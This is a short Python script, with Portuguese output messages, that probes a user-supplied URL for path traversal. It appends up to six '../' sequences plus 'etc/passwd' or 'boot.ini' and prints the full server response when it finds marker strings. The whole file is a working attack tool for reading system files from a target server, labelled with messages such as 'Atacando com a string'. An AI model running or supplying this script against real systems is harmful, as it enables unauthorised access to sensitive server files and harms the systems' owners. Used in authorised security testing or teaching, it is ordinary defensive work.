import requests
import sys

def check_vulnerability(url, payload, expected_string):
    try:
        response = requests.post(url + payload)
        if expected_string in response.text:
            return True, response.text
    except requests.exceptions.RequestException as e:
        print(f"Erro na requisição: {e}")
    return False, None

def main():
    if len(sys.argv) != 2:
        print("Uso: python script.py <URL>")
        sys.exit(1)

    url = sys.argv[1]
    payloads = {'etc/passwd': 'root', 'boot.ini': '[boot loader]'} # root para Linux e boot.ini para Windows Server

    for payload, expected_string in payloads.items():
        for i in range(7):
            up = "../" * i
            is_vulnerable, response_text = check_vulnerability(url, up + payload, expected_string)
            if is_vulnerable:
                print("Parâmetro vulnerável:")
                print(f"Atacando com a string: {up}{payload}\n")
                print(response_text)
                break
            else:
                print("Não é vulnerável")

if __name__ == "__main__":
    main()
